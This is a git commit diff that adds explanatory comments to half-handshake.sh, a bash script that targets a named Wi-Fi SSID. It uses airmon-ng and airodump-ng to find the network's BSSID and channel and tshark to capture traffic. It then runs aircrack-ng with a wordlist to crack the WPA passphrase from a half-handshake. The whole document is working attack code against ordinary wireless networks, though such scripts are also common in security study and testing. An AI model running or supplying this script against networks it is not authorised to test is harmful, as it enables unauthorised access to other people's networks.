ae2fc8fec3672ed64e136ab7100f4c77548b9a00
zanefry <zanefry@gmail.com>
2022-03-02 18:41:09 -0600

    Added some comments

--- half-handshake.sh
+++ half-handshake.sh
@@ -2,7 +2,7 @@
 
 if [ $# -ne 3 ]; then
         echo "usage: ./half-handshake <wireless interface> <target SSID> <wordlist>"
-        exit 1
+        exit 1 # exit 0 means success, nonzero means failure
 fi
 
 IFACE=$1
@@ -15,9 +15,10 @@ sudo airmon-ng check kill &> /dev/null
 sudo airmon-ng start $IFACE &> /dev/null
 
 read -p "Enter Q twice to quit airodump-ng once $SSID appears [Enter]"
-sudo airodump-ng $IFACE -w dump -I 1 --output-format csv
+sudo airodump-ng $IFACE -w dump --output-format csv
 
-BSSID=$(grep -m 1 "$SSID" dump-01.csv | awk -F',' '{print $1}')
+# identify channel and bssid
+BSSID=$(grep -m 1 "$SSID" dump-01.csv | awk -F',' '{print $1}') # -m 1 for first result
 CHANNEL=$(grep -m 1 "$SSID" dump-01.csv | awk -F',' '{print $4}')
 rm -f dump-01.csv
 
@@ -26,14 +27,14 @@ echo $SSID is on channel $CHANNEL with BSSID $BSSID
 read -p "Ready to capture half-handshake. Enter capture length in seconds to begin: " CAPTIME
 
 # capture handshake
-sudo airodump-ng $IFACE -c $CHANNEL -K 1 &> /dev/null & 
+sudo airodump-ng $IFACE -c $CHANNEL -K 1 &> /dev/null & # -K 1 means non-interactive mode
 tshark -i wlan0 -w raw.pcapng -a duration:$CAPTIME &> /dev/null &
 
-printf "Capturing... %3u" $CAPTIME
+printf "Capturing... %3u" $CAPTIME # %3u means unsigned int and pad to 3 chars wide
 while [ $CAPTIME -gt 0 ]; do
         sleep 1
         CAPTIME=$((CAPTIME-1))
-        printf "\b\b\b%3u" $CAPTIME
+        printf "\b\b\b%3u" $CAPTIME # backspace 3 times to update countdown in-place
 done
 
 # filter pcap
@@ -47,5 +48,5 @@ stty sane
 
 if ! sudo aircrack-ng half-handshake.pcap -w $WORDLIST; then
         echo "The capture did not contain any half-handshake"
-        exit 1
+        read -p "Retry capture?"
 fi
